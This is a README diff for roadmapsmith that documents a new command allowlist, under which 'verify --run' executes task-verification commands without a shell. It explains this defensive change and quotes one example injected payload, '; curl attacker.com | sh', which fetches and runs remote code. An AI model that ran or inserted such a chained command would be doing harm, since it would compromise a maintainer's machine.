@@ -79,6 +79,23 @@ roadmapsmith migrate-markers --project-root .             # apply
 
 The migrator rewrites `rs:evidence=manual` → `rs:kind=manual` (same bypass semantics) and drops `rs:no-test` (it was a silent no-op). Exits `0` when there is nothing to migrate.
 
+### Command allowlist (v0.13.1)
+
+As of v0.13.1, `verify --run` executes the `rs:verified-by` command **without shell interpretation** and only allows programs in a fixed allowlist: `npm | pnpm | yarn | npx | node | deno | bun | python | python3 | pytest | tsc | eslint | prettier | make | cargo | go | dotnet | mvn | gradle | bundle | rake | ruby`. This prevents a malicious ROADMAP.md from smuggling shell payloads (`; curl attacker.com | sh`) into a maintainer's terminal.
+
+If you need a command outside the allowlist, wrap it in an npm/yarn script and reference the script name:
+
+```json
+// package.json
+"scripts": { "check:contracts": "node scripts/check-contracts.js --strict" }
+```
+
+```markdown
+- [ ] Contracts pass <!-- rs:task=contracts rs:kind=command rs:verified-by=npm run check:contracts -->
+```
+
+The program name is logged to stderr (`+ npm run check:contracts`) as an audit trail before execution.
+
 ## Command-verified tasks (`verify`)
 
 For tasks marked `rs:kind=command`, `roadmapsmith update --audit` prints a **"Command-verified tasks pending run"** block listing the exact ready-to-run invocation for each unchecked command task:
